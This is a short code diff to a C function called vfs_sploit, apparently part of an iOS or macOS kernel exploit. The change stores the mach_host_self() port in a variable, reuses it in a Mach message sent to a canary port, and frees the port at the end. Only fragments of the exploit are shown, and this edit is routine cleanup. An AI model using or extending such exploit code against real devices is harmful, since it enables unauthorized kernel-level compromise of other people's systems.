@@ -415,7 +415,8 @@ bool vfs_sploit()
     increase_limits();
 
     size_t kernel_page_size = 0;
-    host_page_size(mach_host_self(), &kernel_page_size);
+    host_t host = mach_host_self();
+    host_page_size(host, &kernel_page_size);
     if (kernel_page_size == 0x4000) {
         LOG("this device uses 16k kernel pages");
     } else if (kernel_page_size == 0x1000) {
@@ -829,7 +830,7 @@ bool vfs_sploit()
     host_msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_COPY_SEND);
     host_msg.msgh_size = sizeof(host_msg);
     host_msg.msgh_remote_port = canary_port;
-    host_msg.msgh_local_port = mach_host_self();
+    host_msg.msgh_local_port = host;
     host_msg.msgh_id = 0x12344321;
 
     err = mach_msg(&host_msg,
@@ -1050,6 +1051,8 @@ bool vfs_sploit()
         close(write_ends[i]);
         close(read_ends[i]);
     }
+    
+    mach_port_deallocate(mach_task_self(), host);
 
     LOG("done!");
 
